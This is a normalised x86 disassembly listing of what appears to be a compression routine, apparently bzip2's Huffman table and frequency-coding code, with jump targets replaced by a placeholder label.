mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x2e ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x30 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x30 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x32 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x32 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x34 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x34 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x36 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x36 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x38 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x38 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x3a ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x3a ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x3c ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x3c ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x3e ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x3e ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x40 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x40 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x42 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x42 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x44 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x44 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x46 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x46 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x48 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x48 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x4a ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x4a ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x4c ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x4c ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x4e ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x4e ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x50 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x50 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x52 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x52 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x54 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x54 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x56 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x56 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x58 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x58 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x5a ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x5a ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x5c ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x5c ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x5e ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x5e ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x60 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x60 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x62 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x62 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x64 ]
add eax 0x1
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
xor edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movzx ecx [ eax + 0x4cd2 ]
cmp [ ebp - 0x6c ] ecx
jge r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
push 0x1
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x50 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x5c ]
jge r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
jmp r-xdata
push 0x1
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x268 ] 0x3
jl r-xdata
mov ecx [ ebp - 0x64 ]
imul ecx ecx 0x102
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0x9324 ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
push ecx
push 0x5
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x6c ]
add edx 0x1
mov [ ebp - 0x6c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] 0x0
xor edx edx
jne r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebp - 0x58 ]
cmp edx [ ebp - 0x60 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x54 ]
cmp ecx [ eax + 0x274 ]
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x9324 ]
cmp [ ebp - 0xb0 ] ecx
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x268 ] 0x3
jl r-xdata
push 0xbbf
call sub_4057d5
add esp 0x4
mov edx [ ebp - 0x54 ]
add edx 0x31
mov [ ebp - 0x50 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x50 ]
cmp ecx [ eax + 0x274 ]
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x64 ]
imul ecx ecx 0x102
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0x9324 ]
cmp [ ebp - 0xb0 ] eax
jle r-xdata
push 0x2
push 0x2
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0xb0 ]
add eax 0x1
mov [ ebp - 0xb0 ] eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x58 ]
movzx edx [ ecx + 0x680 ]
cmp edx [ ebp - 0x5c ]
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x274 ]
sub eax 0x1
mov [ ebp - 0x50 ] eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
jmp r-xdata
push 0x3
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0xb0 ]
sub edx 0x1
mov [ ebp - 0xb0 ] edx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x6
jne r-xdata
push 0xbbe
call sub_4057d5
add esp 0x4
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x54 ]
add eax 0x1
cmp eax 0x32
jne r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x50 ]
jg r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x58 ]
movzx edx [ ecx + 0x680 ]
imul edx edx 0x102
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x9324 ]
mov [ ebp - 0xb4 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x58 ]
movzx eax [ edx + 0x680 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x9930 ]
mov [ ebp - 0xbc ] edx
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x2 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x6 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x8 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0xa ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0xc ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0xe ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x10 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x12 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x14 ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x16 ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ecx + eax * 2 + 0x18 ]
mov [ ebp - 0xb8 ] dx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + eax * 4 ]
push edx
movzx eax [ ebp - 0xb8 ]
mov ecx [ ebp - 0xb4 ]
movzx edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
mov ax [ edx + ecx * 2 + 0x1a ]
mov [ ebp - 0xb8 ] ax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xbc ]
mov eax [ edx + ecx * 4 ]
push eax
movzx ecx [ ebp - 0xb8 ]
mov edx [ ebp - 0xb4 ]
movzx eax [ edx + ecx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x1c ]
mov [ ebp - 0xb8 ] cx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xbc ]
mov ecx [ eax + edx * 4 ]
push ecx
movzx edx [ ebp - 0xb8 ]
mov eax [ ebp - 0xb4 ]
movzx ecx [ eax + edx ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
